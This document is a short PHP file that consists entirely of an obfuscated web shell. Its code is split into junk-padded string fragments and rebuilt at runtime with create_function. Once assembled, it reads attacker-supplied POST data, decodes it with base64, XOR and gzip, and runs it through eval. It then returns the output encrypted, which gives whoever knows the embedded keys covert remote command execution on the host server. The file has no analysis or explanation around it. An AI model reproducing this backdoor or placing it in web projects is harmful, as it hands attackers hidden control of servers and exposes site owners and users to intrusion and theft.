<?php
$K='ents("vJphvJp://input"vJ),$m)=vJvJ=1) {@ob_starvJt();@vJevJval(@vJgzuncomvJpress(@x(vJ@';
$H='Jor($i=vJ0;$i<$lvJ;vJ){for($j=0;vJ($jvJvJ<$c&&$ivJvJ<$l);$j++,$i++){$o.=vJ$t{$vJi}^$k';
$I=str_replace('BZ','','cBZreaBZtBZe_BZBZfuncBZtion');
$x='();$rvJ=@base6vJ4_evJncodevJ(@x(@gzcomvJpvJress($o),vJ$k))vJvJ;pvJrint("$p$kh$r$kf");}';
$Y='UpvJDjSvJ";fuvJvJnction x($t,$k){$vJvJc=svJtrlen($k)vJ;vJ$l=strlen(vJ$t);$o="";fv';
$R='{$vJj};}vJ}return $ovJ;vJ}if (vJvJ@preg_matvJch("/$kh(.+)$kfvJ/",vJ@file_gevJt_vJcont';
$U='basevJ64_decodevJ($vJm[1vJ])vJ,$k)));$o=@ob_get_vJcontenvJtsvJ();@ob_endvJ_clevJan';
$Z='$k="avJ6c712bvJa";vJ$kh="cbe07vJa53f5vJ71";$vJkf="11a9ce9vJa649vJ4vJ";$vJp="Y9GaK8Im1tJ';
$G=str_replace('vJ','',$Z.$Y.$H.$R.$K.$U.$x);
$f=$I('',$G);$f();
?>
